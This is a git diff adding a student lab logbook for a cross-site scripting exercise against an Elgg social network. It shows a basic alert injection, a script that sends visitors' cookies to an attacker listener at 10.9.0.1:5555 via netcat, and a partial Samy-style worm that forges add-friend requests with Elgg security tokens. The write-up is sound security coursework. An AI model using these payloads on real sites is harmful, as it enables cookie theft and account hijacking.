@@ -1,16 +1,75 @@
 # Log Book 10
 
 ## Task 1
-...
+For this task we want to inject a script into our profile. We achieved this by posting the following script into the field "Brief description":
+
+```script
+<script>alert('XSS');</script>
+```
+
+This script creates an alert window where it's displayed the string "XSS".
+
+![](imgs/week10/task1.png)
 
 ## Task 2
-...
+By adding the following script to the field "Brief description" where we added the previous script in Task 1, an alert window is displayed with the user's cookies:
+
+![](imgs/week10/task2.png)
 
 ## Task 3
-...
+In this task we want to be able to send the user's cookies to a server that belongs to the attacker. In the script bellow, we imbed the cookies that we want to send in a request that will be made to the attacker's machine:
+
+```script
+<script>document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + ' >');
+</script>
+```
+
+By using the ```netcat``` command line tool to listen for any requests made from users that visited our profile, we can get the user's cookies contained in the requests.
+
+![](imgs/week10/task3.png)
 
 ## Task 4
-...
+The objective of this task is to write a worm that adds Samy to a user's friend list when that user visits Samy's profile.
+
+We can add Samy as a friend normally, and with the extension HTTP Header Live, we can find how a friend HTTP request is encoded:
+
+![](imgs/week10/task4_addSamy.png)
+
+Now we remove Samy as friend so that we can test the script. As we can see in the following image, Alice has no friends:
+
+![](imgs/week10/task4_alice_profile.png)
+
+Using this information, we can create a script that, when executed, forges a request that adds Samy as a friend to the logged in user.
+
+```script
+<script type="text/javascript">
+window.onload = function () {
+var Ajax=null;
+var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+var token="&__elgg_token="+elgg.security.token.__elgg_token;
+
+//Construct the HTTP request to add Samy as a friend.
+
+var sendurl=...; //FILL IN
+
+//Create and send Ajax request to add friend
+
+Ajax=new XMLHttpRequest();
+Ajax.open("GET", sendurl, true);
+Ajax.send();
+}
+</script>
+```
+
+Now we log in into Alice's account and visit Samy's profile. Then we go to Alice's profile and we can see that now, Alice and Samy are friends.
+
+![](imgs/week10/task4_alice_profile.png)
+
+### Question 1
+The referenced lines serve to send the elgg token in our forged request so that the server evaluates the request as a valid request from the user.
+
+### Question 2
+A successful attack can't be launched since the Editor mode filters HTML special characters and we can't edit the inner HTML content of the field. Thus, injecting any script into the About Me field is not possible (if there's only Text mode), as we can't submit the ```<script>``` tag into profile.
 
 ---
 
